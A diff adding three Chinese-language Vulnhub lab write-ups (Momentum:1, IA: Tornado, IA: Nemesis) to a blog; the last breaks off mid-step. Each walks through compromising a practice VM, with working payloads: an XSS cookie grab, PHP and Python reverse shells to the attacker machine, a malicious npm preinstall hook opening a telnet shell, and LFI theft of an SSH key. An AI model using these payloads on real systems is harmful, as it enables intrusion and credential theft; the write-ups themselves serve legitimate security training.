@@ -86,6 +86,501 @@
 
     
         <h2 class="title">
+            <a href="/2022/08/15/Momentum-1/">
+                Momentum 1
+            </a>
+        </h2>
+    
+    <time>
+        Aug 15, 2022
+    </time>
+    <section class="content">
+        <h1><span id="momentum1">Momentum:1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称momentum1">名称：Momentum:1</span></h4><h4><span id="发布日期2021422">发布日期：2021.4.22</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列momentum">系列：Momentum</span></h4><h4><span id="推特al1enum">推特：@AL1ENUM</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
+<h4><span id="难度简单">难度：简单</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名momentumova">文件名：Momentum.ova</span></h4><h4><span id="文件大小662mb">文件大小：662MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagemomentummomentumova">下载地址：</span></h4><h4><span id="md5-556bea96fe2cb1506814d1e79f5c5e19">MD5: 556BEA96FE2CB1506814D1E79F5C5E19</span></h4><h4><span id="sha1-40c918a7eff2eb3cf1708428a583702a4bffd96c">SHA1: 40C918A7EFF2EB3CF1708428A583702A4BFFD96C</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Momentum和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/15/Momentum-1/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页有一些图片：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.106 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/4.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-1/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现四个可见目录，可以去看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.106 -x html,txt,php,bak --wordlist=/usr/share/wordlists/dirb/common.txt，目录扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/6.png" alt="image-"></p>
+</blockquote>
+<h3><span id="xss漏洞利用">XSS漏洞利用</span></h3><blockquote>
+<p>1.访问192.168.56.106&#x2F;js，发现有一个main.js，js里有个重定向链接opus-details.php?id&#x3D;，后面拼接了个参数str，而这个php是主页图片点击后再点击一次的详情介绍：</p>
+<p><img src="/2022/08/15/Momentum-1/7.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-1/8.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-1/9.png" alt="image-"></p>
+<p>2.拼接的str字串会被直接打印出来，因为是js下进行构建的，首先想到xss，构造xss的payload爆出cookie：</p>
+<p><img src="/2022/08/15/Momentum-1/10.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/11.png" alt="image-"></p>
+<p>3.这cookie明显是进行了加密，回到main.js有提示，使用的是aes，进行解密得到很像用户名-密码的形式的字串auxerre-alienum##：</p>
+<p><img src="/2022/08/15/Momentum-1/12.png" alt="image-"></p>
+</blockquote>
+<h3><span id="ssh登录准备提权">SSH登录，准备提权</span></h3><blockquote>
+<p>1.因为靶机有开放22端口，利用ssh登录，发现用户auxerre的密码就是auxerre-alienum##：</p>
+<p><img src="/2022/08/15/Momentum-1/13.png" alt="image-"></p>
+<p>2.接下来我们要使用LinEnum.sh这个工具对靶机进行进一步信息收集，在kali搭建一个http服务，准备上传工具到靶机<br>（工具地址：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh%EF%BC%89%EF%BC%9A">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh）：</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/14.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:8001/LinEnum.sh，靶机下载工具（文件在桌面）</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/15.png" alt="image-"></p>
+<p>3.添加权限，靶机运行LinEnum.sh后，查看输出信息，发现6379端口占用，此端口是数据库redis的默认端口，确认后可以尝试kali登录redis：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh &gt; 1.txt</span><br><span class="line">cat 1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/16.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-1/17.png" alt="image-"></p>
+<p><img src="/2022/08/15/Momentum-1/18.png" alt="image-"></p>
+<p>4.现在我们可以尝试利用ssh远程连接6379端口，然后在kali端登录，这里kali同样使用6379端口：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 6379:127.0.0.1:6379 auxerre@192.168.56.106</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/19.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/20.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.我们可以在数据库内看到一个rootpass键，而键内包含着很像是密码的字串，使用root用户登录，成功提权：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keys *</span><br><span class="line">get rootpass</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/Momentum-1/21.png" alt="image-"></p>
+<p>2.进行root登录，在&#x2F;root目录下能找到flag，即root.txt：</p>
+<p><img src="/2022/08/15/Momentum-1/22.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/Momentum/" rel="tag">Momentum</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/15/IA-Tornado/">
+                IA Tornado
+            </a>
+        </h2>
+    
+    <time>
+        Aug 15, 2022
+    </time>
+    <section class="content">
+        <h1><span id="ia-tornado">IA: TORNADO</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称ia-tornado">名称：IA: Tornado</span></h4><h4><span id="发布日期20201220">发布日期：2020.12.20</span></h4><h4><span id="作者infosec-articles">作者：InfoSec Articles</span></h4><h4><span id="系列ia">系列：IA</span></h4><h4><span id="推特-infosecarticles">推特: @infosecarticles</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>catchme:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="难度中等">难度：中等</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名tornadoova">文件名：tornado.ova</span></h4><h4><span id="文件大小1019mb">文件大小：1019MB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomiatornadoova">下载地址：</span></h4><h4><span id="md5-86b49bd71057db337a85c1ec1bab1076">MD5: 86B49BD71057DB337A85C1EC1BAB1076</span></h4><h4><span id="sha1-a74d80b7bde2b4da63aaf1e6b4714e43d6862409">SHA1: A74D80B7BDE2B4DA63AAF1E6B4714E43D6862409</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机tornado和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/15/IA-Tornado/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，还是Apache初始页，源码没有更多信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.132 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/4.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/5.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现&#x2F;bluesky目录，页面源码也没发现更多可用信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.132 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/6.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/7.png" alt="image-"></p>
+</blockquote>
+<h3><span id="文件包含漏洞发现">文件包含漏洞发现</span></h3><blockquote>
+<p>1.我们继续对&#x2F;bluesky目录进行扫描，发现有登录页与注册页，我们在注册页随意注册然后登录：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.132/bluesky -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/8.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/9.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/10.png" alt="image-"></p>
+<p>2.登录后，在PORTFOLIO页能发现提示存在LFI，并且在源码内有路径提示：</p>
+<p><img src="/2022/08/15/IA-Tornado/11.png" alt="image-"></p>
+<p>3.利用LFI，我们可以获取到一些登录账号：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.132/~tornado/imp.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/12.png" alt="image-"></p>
+</blockquote>
+<h3><span id="sql截断攻击">SQL截断攻击</span></h3><blockquote>
+<p>1.然而，当我们使用这些账号，会发现这些账号都已经被注册了，这时我在注册页源码发现前端对email长度做了最大限制：</p>
+<p><img src="/2022/08/15/IA-Tornado/13.png" alt="image-"></p>
+<p>2.这时可以想到是否存在SQL截断攻击的利用，修改maxlength后测试发现，能够将jacob@tornado用户的密码更改：</p>
+<p><img src="/2022/08/15/IA-Tornado/14.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/15.png" alt="image-"></p>
+<p>3.成功登录到jacob@tornado：</p>
+<p><img src="/2022/08/15/IA-Tornado/16.png" alt="image-"></p>
+</blockquote>
+<h3><span id="命令注入构建shell">命令注入，构建shell</span></h3><blockquote>
+<p>1.现在我们可以在CONTACT页面输入payload，并在kali开启对应监听，获得shell：</p>
+<p><img src="/2022/08/15/IA-Tornado/17.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">php -r &#x27;$sock=fsockopen(&quot;192.168.56.102&quot;,9002);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span><br><span class="line"></span><br><span class="line">nc -lvnp 9002</span><br><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/18.png" alt="image-"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.查看可用文件权限，发现npm可以使用：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+
+<p>2.先在kali下写一个json文件，如package.json，开启http服务：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">vim package.json</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;jin&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;1.0.0&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="string">&quot;follow jin on medium and twitter&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;main&quot;</span><span class="punctuation">:</span> <span class="string">&quot;index.js&quot;</span><span class="punctuation">,</span></span><br><span class="line"><span class="attr">&quot;scripts&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line"><span class="attr">&quot;preinstall&quot;</span><span class="punctuation">:</span> <span class="string">&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|telnet 192.168.56.102 9003 &gt; /tmp/f&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line">python3 -m http.server <span class="number">8001</span></span><br></pre></td></tr></table></figure>
+
+<p>3.在靶机&#x2F;tmp目录下建立一个json目录，然后获取json文件，再利用npm触发shell：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">mkdir jin</span><br><span class="line">wget http://192.168.56.102:8001/package.json</span><br><span class="line">mv package.json jin</span><br><span class="line">chmod +s jin/</span><br><span class="line"></span><br><span class="line">sudo -u catchme /usr/bin/npm i /tmp/jin — unsafe</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/19.png" alt="image-"><br><img src="/2022/08/15/IA-Tornado/20.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/21.png" alt="image-"></p>
+<p>4.可以成功地在catchme用户目录下找到第一个flag，user.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd ~</span><br><span class="line">ls -al</span><br><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/22.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.查看同目录下的enc.py文件，发现是个加密程序，告知我们密文，粗略阅读程序，明显是凯撒密码的变种，我们利用<a target="_blank" rel="noopener" href="https://www.boxentriq.com/code-breaking/caesar-cipher%EF%BC%8C%E4%B8%8D%E4%BD%BF%E7%94%A8key%E8%87%AA%E5%8A%A8%E7%A0%B4%E8%A7%A3%EF%BC%9A">https://www.boxentriq.com/code-breaking/caesar-cipher，不使用key自动破解：</a></p>
+<p><img src="/2022/08/15/IA-Tornado/23.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Tornado/24.png" alt="image-"></p>
+<p>2.但自动破解出来的并不是密码，但非常接近了，我们回看程序，对比自动解出的字串，得到key是u，而w是在u后的字符，不应该变化，可分析出最后密码是idkrootpassword：</p>
+<p><img src="/2022/08/15/IA-Tornado/25.png" alt="image-"></p>
+<p>3.最后能在&#x2F;root目录下发现第二个flag，root.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br><span class="line">ls -al</span><br><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Tornado/26.png" alt="image-"></p>
+</blockquote>
+
+
+        
+
+        
+            <div class="tags">
+                <a class="tag-none-link" href="/tags/IA/" rel="tag">IA</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
+            </div>
+        
+
+    </section>
+</article>
+  
+    <article class="post ">
+
+    
+        <h2 class="title">
+            <a href="/2022/08/15/IA-Nemesis/">
+                IA Nemesis
+            </a>
+        </h2>
+    
+    <time>
+        Aug 15, 2022
+    </time>
+    <section class="content">
+        <h1><span id="ia-nemesis-101">IA: NEMESIS (1.0.1)</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
+<h4><span id="名称ia-nemesis-101">名称：IA: Nemesis (1.0.1)</span></h4><h4><span id="发布日期20201025">发布日期：2020.10.25</span></h4><h4><span id="作者infosec-articles">作者：InfoSec Articles</span></h4><h4><span id="系列ia">系列：IA</span></h4><h4><span id="推特-infosecarticles">推特: @infosecarticles</span></h4></blockquote>
+<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
+<h4><span id="flags">Flags：</span></h4><p>thanos:&#x2F;<del>&#x2F;flag1.txt<br>carlos:&#x2F;</del>&#x2F;flag2.txt<br>root:&#x2F;root&#x2F;root.txt </p>
+<h4><span id="难度困难">难度：困难</span></h4></blockquote>
+<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
+<h4><span id="文件名nemesis-v101ova">文件名：Nemesis-v1.0.1.ova</span></h4><h4><span id="文件大小537mb">文件大小：537MB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomianemesis-v101ova">下载地址：</span></h4><h4><span id="md5-1e1b81a4b2af9a2bac30ed2b26b779bb">MD5: 1E1B81A4B2AF9A2BAC30ED2B26B779BB</span></h4><h4><span id="sha1-182f226ebd925575f50f24d04c515df79424775e">SHA1: 182F226EBD925575F50F24D04C515DF79424775E</span></h4></blockquote>
+<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
+<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
+<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
+<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
+<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
+<p>1.将靶机Nemesis和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
+<p><img src="/2022/08/15/IA-Nemesis/1.png" alt="image-"></p>
+</blockquote>
+<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
+<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/2.png" alt="image-"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/3.png" alt="image-"></p>
+<p>2.再进行端口扫描，发现开放了80，52845和52846端口，访问主页，在sign up页的validate函数可以发现登录的用户和密码，登录之后没有可用信息：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.131 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/4.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Nemesis/5.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Nemesis/8.png" alt="image-"></p>
+<p>3.最后再进行一下目录扫描，发现robots.txt文件，提示我们去寻找可用的攻击点：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.131 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/6.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Nemesis/7.png" alt="image-"></p>
+</blockquote>
+<h3><span id="文件包含漏洞利用">文件包含漏洞利用</span></h3><blockquote>
+<p>1.我们接着访问52845端口，网页源码没有过多发现：</p>
+<p><img src="/2022/08/15/IA-Nemesis/9.png" alt="image-"></p>
+<p>2.在Contact Us页发现在Message框内输入任何信息都会收到写入文件的提示，测试后发现确实存在文件包含漏洞：</p>
+<p><img src="/2022/08/15/IA-Nemesis/10.png" alt="image-"></p>
+<p><img src="/2022/08/15/IA-Nemesis/11.png" alt="image-"></p>
+<p>3.发现靶机存在thanos用户，可以尝试获取其ssh密钥：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/home/thanos/.ssh/id_rsa</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/12.png" alt="image-"></p>
+<p>4.将thanos用户ssh私钥获取到kali后，ssh登录thanos用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">chmod 400 id</span><br><span class="line">ssh thanos@192.168.56.131 -p 52846 -i id</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/13.png" alt="image-"></p>
+<p>5.登录后可在用户目录下发现第一个flag，即flag1.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br><span class="line">cat flag1.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/14.png" alt="image-"></p>
+</blockquote>
+<h3><span id="初步提权">初步提权</span></h3><blockquote>
+<p>1.我们可以在thanos用户目录下发现属于carlos用户的backup.py：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat backup.py</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/15.png" alt="image-"></p>
+<p>2.通过利用pspy64s工具，可以发现backup.py是被定时调用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br><span class="line"></span><br><span class="line">wget http://192.168.56.102:8001/pspy64s，thanos获取pspy64s工具</span><br><span class="line">chmod +x pspy64s</span><br><span class="line">./pspy64s</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/16.png" alt="image-"></p>
+<p>3.那我们只需要把原backup.py重命名（因为我们没有修改其内容的权限），重新写入一个backup.py，内容为反弹shell就可以：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">mv backup.py backup_original.py</span><br><span class="line">vi backup.py</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">&quot;192.168.56.102&quot;</span>,<span class="number">9002</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line">p=subprocess.call([<span class="string">&quot;/bin/sh&quot;</span>,<span class="string">&quot;-i&quot;</span>])</span><br><span class="line"></span><br><span class="line">nc -lvnp <span class="number">9002</span>，kali开启对应端口监听</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/17.png" alt="image-"></p>
+<p>4.可以在carlos用户目录下发现第二个flag，即flag2.txt：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ls -al</span><br><span class="line">cat flag2.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/18.png" alt="image-"></p>
+</blockquote>
+<h3><span id="root提权">root提权</span></h3><blockquote>
+<p>1.同时在carlos用户目录下还能发现root.txt，查看后是让我们去分析encrypt.py文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/08/15/IA-Nemesis/19.png" alt="image-"></p>
+<p>2.查看encrypt.py文件后，联系root.txt，通过位置对应我们能知道FUN的密文是QZA，则可写出解密程序：</p>
